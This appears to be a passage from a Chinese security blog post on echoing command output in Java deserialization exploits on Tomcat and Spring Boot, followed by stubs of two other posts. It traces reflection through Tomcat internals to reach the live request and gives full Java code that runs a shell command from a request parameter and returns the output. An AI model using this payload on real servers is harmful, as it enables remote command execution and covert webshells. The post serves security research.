<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223145840694.png" alt="image-20201223145840694"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223145931811.png" alt="image-20201223145931811"></p>
<p>​        查看继承关系，可以发现ProtocolHandler为AbstractProtocol的接口。不同的请求协议的类型会调用不同的子类去进行处理。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223151356955.png" alt="image-20201223151356955"></p>
<p>​        所以我们如果可以找到connector对象，也可以间接获取request。在tomcat.java中，会将connector存储到Service对象中，所以我们只要可以获取Service对象就可以了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223152222218.png" alt="image-20201223152222218"></p>
<p>​        StandardService可以通过applicationContext来获取，applicationContext可以通过Context获取到，Context可以通过webappClassLoaderBase来获取,在Tomcat中通过webappClassLoader来加载web应用的calss文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tomcat的类加载器可以分为两部分，第一个是Tomcat自身所使用的类加载器，会加载jre的lib包及tomcat的lib包的类，遵循类加载的双亲委派机制；第二个是每个Web应用程序用的，每个web应用程序都有自己专用的WebappClassLoader，优先加载&#x2F;web-inf&#x2F;lib下的jar中的class文件，这样就隔离了每个web应用程序的影响，但是webappClassLoader没有遵循类加载的双亲委派机制，处理的方法就是在使用webappClassLoader的load加载类会进行过滤，如果有些类被过滤掉还是通过双亲委派机制优先从父加载器中加载类。</span><br></pre></td></tr></table></figure>

<p>​        我们有两种方式可以获取到webappClassLoader，一种是通过<code>Class.forName(&quot;webappClassLoader&quot;).getClassLoader()</code>,一种是通过<code>Thread.currentThread().getContextClassLoader()</code>来获取，我们对比一下这两种方式获取的ClassLoader有什么不同。<code>Thread.currentThread().getContextClassLoader()</code>是获取当前线程的类加载器。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Thread.currentThread().getContextClassLoader());     System.out.println(Class.forName(<span class="string">"org.apache.catalina.loader.WebappClassLoaderBase"</span>).getClassLoader());</span><br></pre></td></tr></table></figure>

<p>​        运行后我们可以看到通过Thread类获取的ClassLoader是TomcatEmbeddedWebappClassLoader类型的，而通过forName获取的是AppClassLoader类型，因此我们要获取WebappClassLoader，需要使用Thread来获取。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223170437936.png" alt="image-20201223170437936"></p>
<p>​        所以我们可以通过如下代码获取到TomcatEmbeddedWebappClassLoader</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader webappClassLoaderBase =(org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader) Thread.currentThread().getContextClassLoader();</span><br></pre></td></tr></table></figure>

<p>​        而TomcatEmbeddedWebappClassLoader是WebappClassLoaderBase的子类，也就是说这个TomcatEmbeddedWebappClassLoader本质上也是调用了tomcat自己实现的类加载器WebappClassLoaderBase来实现类加载的。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223171242354.png" alt="image-20201223171242354"></p>
<p>​    获取TomcatEmbeddedWebappClassLoader后，我们可以通过这个ClassLoader获取Context对象，再通过Context获取到applicationContext,也就可以获取到service对象了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.Context context=webappClassLoaderBase.getResources().getContext();</span><br><span class="line">           java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");</span><br><span class="line">           contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">           org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(context);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223173018910.png" alt="image-20201223173018910"></p>
<p>​        通过下面的代码获取application的service</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");</span><br><span class="line"></span><br><span class="line">serviceField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);</span><br></pre></td></tr></table></figure>

<p>​        获取到service后，通过service的findConnectors方法获取Connector。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223174205164.png" alt="image-20201223174205164"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.connector.Connector connectors[]=standardService.findConnectors();</span><br></pre></td></tr></table></figure>

<p>​        遍历connectors，通过connector的getProtocolHandler方法获取protocolHandler,再通过protocolHandler的getHandler获取connectoinHandler。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();</span><br><span class="line"></span><br><span class="line">java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);</span><br><span class="line">getHandlerMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"> org.apache.tomcat.util.net.AbstractEndpoint.Handler connectoinHandler= (org.apache.tomcat.util.net.AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler,<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223175015493.png" alt="image-20201223175015493"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223175429390.png" alt="image-20201223175429390"></p>
<p>​        下面需要从ConnectionHandler中取出global中的内容</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field globalField = Class.forName(<span class="string">"org.apache.coyote.AbstractProtocol$ConnectionHandler"</span>).getDeclaredField(<span class="string">"global"</span>);</span><br><span class="line"></span><br><span class="line">globalField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(connectoinHandler);</span><br></pre></td></tr></table></figure>

<p>​        再从global中取出processors对象，里面包含了RequestInfo数组</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223180014242.png" alt="image-20201223180014242"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");</span><br><span class="line">processorsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);</span><br></pre></td></tr></table></figure>

<p>​        由于获取到的Processors是一个ArrayList列表，所以我们需要遍历这个列表出去RequestInfo对象，获取到RequestInfo对象后需要判断当前的RequestInfo是否为我们本次请求的。可以通过是否包含我们需要的参数来进行判断。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requestInfo.getCurrentQueryString().contains(<span class="string">"xxxx"</span>)</span><br></pre></td></tr></table></figure>

<p>​        跟进getCurrentQueryString，调用this.req.queryString方法，在queryString中返回我们传入的参数和内容。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223181123439.png" alt="image-20201223181123439"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223181134400.png" alt="image-20201223181134400"></p>
<p>​        找到我们本次请求的requestInfo后，我们需要获取request对象，而requestInfo.req属性中保存了当前的request对象，所以我们只要通过反射调用获取到req属性的内容即可。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223181335226.png" alt="image-20201223181335226"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");</span><br><span class="line">requestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(requestInfo);  <span class="comment">//获取request对象，这个对象是coyote类型的，和我们平时使用的Request不太一样</span></span><br><span class="line">org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(<span class="number">1</span>); <span class="comment">//通过getNote方法获取org.apache.catalina.connector.Request对象</span></span><br></pre></td></tr></table></figure>

<p>​            在request中保存的对象为coyote.request类型</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223200125355.png" alt="image-20201223200125355"></p>
<p>​            通过request.getNote获取org.apache.catalina.connector.Request对象</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223200553783.png" alt="image-20201223200553783"></p>
<p>​            在org.apache.catalina.connector.Request中可以获取HttpServletRequest和HttpServletResponse对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223201314166.png" alt="image-20201223201314166"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223201323147.png" alt="image-20201223201323147"></p>
<p>​        最后我们获取request对象，并获取我们要执行的命令，再获取response对象，将命令执行的结果写入到Response对象中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">String cmd =request.getParameter(pass);</span><br><span class="line">String[] cmds = !System.getProperty(<span class="string">"os.name"</span>).toLowerCase().contains(<span class="string">"win"</span>) ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, cmd&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;;</span><br><span class="line">java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">String output = s.hasNext() ? s.next() : <span class="string">""</span>;</span><br><span class="line">java.io.Writer writer = request.getResponse().getWriter();</span><br><span class="line">java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField(<span class="string">"usingWriter"</span>);</span><br><span class="line">usingWriter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">usingWriter.set(request.getResponse(), Boolean.FALSE);</span><br><span class="line">writer.write(output);</span><br><span class="line">writer.flush();</span><br></pre></td></tr></table></figure>

<p>​        整个过程分析结束了，最后给出spring-boot下的完整代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.ResponseFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.Writer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/test"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">index</span><span class="params">(String input,HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//传递命令的参数名</span></span><br><span class="line">            String pass=<span class="string">"cmd12138"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//WebappClassLoaderBase</span></span><br><span class="line">            org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader webappClassLoaderBase =(org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="comment">//ApplicationContext</span></span><br><span class="line">            org.apache.catalina.Context context=webappClassLoaderBase.getResources().getContext();</span><br><span class="line">            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");</span><br><span class="line">            contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(context);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//StandardService</span></span><br><span class="line">            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");</span><br><span class="line">            serviceField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Connector</span></span><br><span class="line">            org.apache.catalina.connector.Connector connectors[]=standardService.findConnectors();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//筛选Connector</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;connectors.length;i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (connectors[i].getScheme().contains(<span class="string">"http"</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//AbstractProtocol$ConnectoinHandler</span></span><br><span class="line">                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();</span><br><span class="line">                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);</span><br><span class="line">                    getHandlerMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.tomcat.util.net.AbstractEndpoint.Handler connectoinHandler= (org.apache.tomcat.util.net.AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//RequestGroupInfo</span></span><br><span class="line">                    java.lang.reflect.Field globalField = Class.forName(<span class="string">"org.apache.coyote.AbstractProtocol$ConnectionHandler"</span>).getDeclaredField(<span class="string">"global"</span>);</span><br><span class="line">                    globalField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(connectoinHandler);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//获取RequestGroupInfo中储存了RequestInfo的processors</span></span><br><span class="line">                    java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");</span><br><span class="line">                    processorsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//通过QueryString筛选</span></span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; list.size(); k++) &#123;</span><br><span class="line">                        org.apache.coyote.RequestInfo requestInfo= (org.apache.coyote.RequestInfo) list.get(k);</span><br><span class="line">                        <span class="keyword">if</span>(requestInfo.getCurrentQueryString().contains(pass))&#123;</span><br><span class="line"></span><br><span class="line">                            <span class="comment">//request</span></span><br><span class="line">                            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");</span><br><span class="line">                            requestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                            org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(requestInfo);</span><br><span class="line">                            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">//执行命令并回显</span></span><br><span class="line">                            String cmd =request.getParameter(pass);</span><br><span class="line">                            String[] cmds = !System.getProperty(<span class="string">"os.name"</span>).toLowerCase().contains(<span class="string">"win"</span>) ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, cmd&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;;</span><br><span class="line">                            java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                            java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">                            String output = s.hasNext() ? s.next() : <span class="string">""</span>;</span><br><span class="line">                            java.io.Writer writer = request.getResponse().getWriter();</span><br><span class="line">                            java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField(<span class="string">"usingWriter"</span>);</span><br><span class="line">                            usingWriter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                            usingWriter.set(request.getResponse(), Boolean.FALSE);</span><br><span class="line">                            writer.write(output);</span><br><span class="line">                            writer.flush();</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        目前分析的这些回显方案总的来讲分为如下两种思路</p>
<ul>
<li>通过defineClass类似的方法加载远程或者本地的字节码执行命令，并将命令执行的结果通过异常显示。</li>
<li>通过某种方法获取请求的响应包，将命令执行的结果写入到响应包中。</li>
</ul>
<p>​        在本次了解JAVA反序列化回显方案中，还是发现了很多知识点的不清晰，深深感到自己知识功底不扎实，Linux和Windows的回显方案也依赖对于Socket的理解上，Tomcat的回显又依赖于对tomcat源码的了解上，如果没有这些基础，是很难自己挖掘到这种回显方法的。</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://l3yx.github.io/2020/03/31/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/#%E8%8E%B7%E5%8F%96Tomcat-Response" target="_blank" rel="noopener">java Web代码执行漏洞回显总结</a></p>
<p><a href="https://github.com/feihong-cs/Java-Rce-Echo" target="_blank" rel="noopener">Java RCE 回显</a></p>
<p><a href="https://xz.aliyun.com/t/7740#toc-4" target="_blank" rel="noopener">Java 反序列化回显的多种姿势</a></p>
<p><a href="https://xz.aliyun.com/t/7388#toc-1" target="_blank" rel="noopener">基于tomcat的内存 Webshell 无文件攻击技术</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3" target="_blank" rel="noopener">基于全局储存的新思路 | Tomcat的一种通用回显方法研究</a></p>
<p><a href="https://xz.aliyun.com/t/7228" target="_blank" rel="noopener">Weblogic使用ClassLoader和RMI来回显命令执行结果</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/12/07/readObject%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/12/07/readObject%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">readObject深入分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-12-07 13:56:03 / Modified: 14:05:11" itemprop="dateCreated datePublished" datetime="2020-12-07T13:56:03+08:00">2020-12-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​    讲到JAVA的反序列化，我们肯定离不开readObject函数，我们在分析JAVA反序列化漏洞中，常常跟踪到readObject就跟踪结束，我们有没有想过readObject是如何实现反序列化的？为什么我们找到了readObject后并不能直接造成命令执行，还需要去寻找其他的调用链来配合才可以命令执行？今天我将和大家一起学习readObject这个函数。</p>
<h3 id="readObject简介"><a href="#readObject简介" class="headerlink" title="readObject简介"></a>readObject简介</h3><p>​        </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">JAVA反射机制学习</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-12-02 14:04:35" itemprop="dateCreated datePublished" datetime="2020-12-02T14:04:35+08:00">2020-12-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-12-03 15:36:44" itemprop="dateModified" datetime="2020-12-03T15:36:44+08:00">2020-12-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
